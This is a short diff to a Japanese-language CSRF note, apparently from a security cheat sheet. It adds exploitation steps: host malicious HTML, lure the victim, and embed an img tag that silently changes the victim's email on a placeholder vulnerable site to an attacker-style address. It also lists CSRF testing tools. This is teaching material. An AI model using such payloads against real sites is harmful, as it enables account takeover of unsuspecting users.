@@ -14,9 +14,14 @@ CSRFは、攻撃者がユーザに意図しない操作を実行させること�
 
 ---
 ## 悪用方法の説明
+1. 自分が管理しているサイトに、悪意のあるHTMLを配置し、被害者を誘導する。
+2. 以下のリクエストをユーザに送信させる。
+```
+<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
+```
 
 ---
-# # Tools
+## Tools
 - https://github.com/0xInfection/XSRFProbe
 - https://github.com/0xInfection/CSRFPocGenerator.git
 
